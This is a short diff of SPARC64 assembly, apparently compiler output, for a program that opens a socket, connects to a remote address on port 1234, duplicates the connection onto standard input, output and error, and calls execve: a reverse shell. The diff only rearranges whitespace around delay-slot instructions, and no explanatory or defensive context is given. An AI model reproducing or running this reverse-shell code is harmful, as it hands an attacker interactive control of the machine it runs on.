@@ -14,12 +14,14 @@ main:
 	or	%g1, 127, %g1
 	sethi	%hi(_GLOBAL_OFFSET_TABLE_-4), %l7
 	call	__sparc_get_pc_thunk.l7
-	 add	%l7, %lo(_GLOBAL_OFFSET_TABLE_+4), %l7
+	
+  add	%l7, %lo(_GLOBAL_OFFSET_TABLE_+4), %l7
 	stx	%g1, [%fp+2007]
 	mov	0, %o2
 	mov	1, %o1
 	call	socket, 0
-	 mov	2, %o0
+	
+  mov	2, %o0
 	mov	2, %g1
 	sth	%g1, [%fp+2031]
 	mov	1234, %g1
@@ -31,17 +33,21 @@ main:
 	st	%g1, [%fp+2039]
 	mov	16, %o2
 	call	connect, 0
-	 add	%fp, 2031, %o1
+	add	%fp, 2031, %o1
+   
 	mov	0, %o1
 	call	dup2, 0
-	 mov	%i5, %o0
+	
+  mov	%i5, %o0
 	mov	0, %i0
 	mov	1, %o1
 	call	dup2, 0
-	 mov	%i5, %o0
+	
+  mov	%i5, %o0
 	mov	2, %o1
 	call	dup2, 0
-	 mov	%i5, %o0
+	
+  mov	%i5, %o0
 	stx	%g0, [%fp+2023]
 	mov	0, %o2
 	add	%fp, 2015, %o1
@@ -49,8 +55,10 @@ main:
 	xor	%o0, %gdop_lox10(.LC0), %o0
 	ldx	[%l7 + %o0], %o0, %gdop(.LC0)
 	call	execve, 0
-	 stx	%o0, [%fp+2015]
+	
+  stx	%o0, [%fp+2015]
 	return	%i7+8
+  
 	 nop
 	.size	main, .-main
 	.ident	"GCC: (Debian 6.3.0-19) 6.3.0 20170618"
